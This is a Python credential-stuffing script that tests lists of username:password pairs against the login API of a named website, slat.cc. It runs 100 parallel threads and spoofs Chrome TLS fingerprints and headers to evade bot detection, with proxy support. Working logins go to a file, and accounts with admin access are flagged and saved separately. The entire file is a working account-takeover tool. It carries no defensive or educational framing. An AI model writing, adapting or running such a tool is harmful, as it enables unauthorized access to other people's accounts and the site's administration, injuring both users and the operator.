import concurrent.futures
from curl_cffi import requests
import threading, concurrent.futures
from colorama import Fore
import tls_client

class feds:
    def __init__(self):
        self.session = tls_client.Session(
            client_identifier="chrome_130",
            random_tls_extension_order=True
        )
        self.session.headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://slat.cc',
            'pragma': 'no-cache',
            'prefer': 'safe',
            'priority': 'u=1, i',
            'referer': 'https://slat.cc/auth?flow=signin',
            'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
        }
        self.prox = "" # proxy here
        self.proxy = {
            "http": self.prox,
            "https": self.prox
        }
        self.session.proxies = self.proxy

    def check(self, username, password):
        data = {
            'userOrEmail': username,
            'password': password,
            'rememberMe': "False",
        }
        r = self.session.post('https://slat.cc/api/auth/login', json=data)
        if "Successfully logged in" in r.text:
            print(f'{Fore.GREEN}[+] Valid: {username}:{password} {Fore.RESET}')
            with open("valid_accounts.txt", "a") as file:
                file.write(f"{username}:{password}\n")
            self.session.cookies.update(r.cookies)
            rf = self.session.get("https://slat.cc/dashboard/overview").text
            if "admin" in rf:
                print(f'{Fore.CYAN}[+] FOUND ADMIN ACCOUNT: {username}:{password} {Fore.RESET}')
                with open("admins.txt", "a") as file:
                    file.write(f"{username}:{password}\n")
        else:
            print(f'{Fore.RED}[-] Invalid: {username}:{password} {Fore.RESET}')

if __name__ == "__main__":
    with open('accounts.txt') as file:
        accounts=file.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as thread:
        for account in accounts:
            try:
                if ":" in account:
                    user, passw=account.split(':')
            except:
                continue
            thread.submit(feds().check, user, passw)